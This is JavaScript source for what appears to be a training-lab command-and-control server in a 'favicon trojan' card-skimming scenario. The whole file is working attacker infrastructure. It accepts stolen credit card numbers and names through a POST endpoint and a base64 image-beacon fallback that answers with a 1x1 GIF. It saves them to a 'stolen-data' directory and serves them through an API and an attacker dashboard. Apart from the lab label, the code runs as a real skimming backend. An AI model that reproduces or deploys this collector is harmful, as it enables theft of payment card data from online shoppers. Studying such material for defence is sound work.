/**
 * LAB 4 C2 SERVER — Steganography / Favicon Trojan
 *
 * Receives credit card data exfiltrated by the skimmer
 * hidden inside favicon.ico via steganography.
 */

const express = require('express')
const cors = require('cors')
const rateLimit = require('express-rate-limit')
const path = require('path')
const fs = require('fs').promises

const app = express()
const PORT = process.env.PORT || 3000

// Rate limiter — prevents abuse of expensive I/O routes
const collectLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                  // max 100 requests per window per IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, please try again later.' }
})

const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 200,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, please try again later.' }
})
const DATA_DIR = path.join(__dirname, 'stolen-data')

// Middleware
app.use(cors())
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

// Ensure data directory
async function ensureDataDir() {
  try { await fs.mkdir(DATA_DIR, { recursive: true }) } catch (e) { /* exists */ }
}

// ──────────────────────────────────────────────────
// POST /collect — receives stolen card data
// ──────────────────────────────────────────────────
app.post('/collect', collectLimiter, async (req, res) => {
  await ensureDataDir()
  const ts = new Date().toISOString()
  const body = req.body || {}

  // Sanitize user input for safe logging (prevent log injection)
  const safeName = String(body.card_name || 'N/A').replace(/[\r\n]/g, ' ')
  const safeSource = String(body.source || 'unknown').replace(/[\r\n]/g, ' ')

  console.log(`\n[C2] 🎯 Stolen data received at ${ts}`)
  console.log(`[C2]   Card: ${body.card_number || 'N/A'}`)
  console.log(`[C2]   Name: ${safeName}`)
  console.log(`[C2]   Source: ${safeSource}`)

  const record = {
    id: `stego-${Date.now()}`,
    timestamp: ts,
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('user-agent'),
    data: body
  }

  // Save individual file
  const filename = `${record.id}.json`
  await fs.writeFile(
    path.join(DATA_DIR, filename),
    JSON.stringify(record, null, 2)
  )

  // Append to master log
  try {
    await fs.appendFile(
      path.join(DATA_DIR, 'master-log.jsonl'),
      JSON.stringify(record) + '\n'
    )
  } catch (e) { /* ignore */ }

  res.status(200).json({ status: 'ok', id: record.id })
})

// ──────────────────────────────────────────────────
// GET /collect — image beacon fallback
// ──────────────────────────────────────────────────
app.get('/collect', collectLimiter, async (req, res) => {
  if (req.query.d) {
    try {
      await ensureDataDir()
      const decoded = Buffer.from(req.query.d, 'base64').toString('utf8')
      const parsed = JSON.parse(decoded)
      const record = {
        id: `beacon-${Date.now()}`,
        timestamp: new Date().toISOString(),
        data: parsed
      }
      await fs.writeFile(
        path.join(DATA_DIR, `${record.id}.json`),
        JSON.stringify(record, null, 2)
      )
    } catch (e) { /* silent */ }
  }
  // Return 1x1 transparent GIF
  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')
  res.writeHead(200, { 'Content-Type': 'image/gif', 'Content-Length': gif.length })
  res.end(gif)
})

// ──────────────────────────────────────────────────
// GET /api/stolen — returns all stolen records as JSON
// ──────────────────────────────────────────────────
app.get('/api/stolen', apiLimiter, async (req, res) => {
  await ensureDataDir()
  try {
    const files = await fs.readdir(DATA_DIR)
    const jsonFiles = files.filter(f => f.endsWith('.json') && f !== 'master-log.jsonl')
    const records = []
    for (const file of jsonFiles) {
      try {
        const content = await fs.readFile(path.join(DATA_DIR, file), 'utf8')
        records.push(JSON.parse(content))
      } catch (e) { /* skip bad files */ }
    }
    records.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    res.json({ success: true, count: records.length, records })
  } catch (e) {
    res.json({ success: true, count: 0, records: [] })
  }
})

// ──────────────────────────────────────────────────
// GET /stolen — serves attacker dashboard
// ──────────────────────────────────────────────────
app.get('/stolen', apiLimiter, async (req, res) => {
  try {
    const html = await fs.readFile(path.join(__dirname, 'dashboard.html'), 'utf8')
    res.send(html)
  } catch (e) {
    res.status(500).send('Dashboard not available')
  }
})

// Alias
app.get('/dashboard', async (req, res) => {
  try {
    const html = await fs.readFile(path.join(__dirname, 'dashboard.html'), 'utf8')
    res.send(html)
  } catch (e) {
    res.status(500).send('Dashboard not available')
  }
})

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'operational', lab: 'lab4-steganography' })
})

// Start
app.listen(PORT, () => {
  console.log(`\n🏴‍☠️  Lab 4 C2 Server (Steganography) listening on port ${PORT}`)
  console.log(`   Dashboard: http://localhost:${PORT}/stolen`)
  console.log(`   Collect:   http://localhost:${PORT}/collect`)
  console.log(`   API:       http://localhost:${PORT}/api/stolen\n`)
})
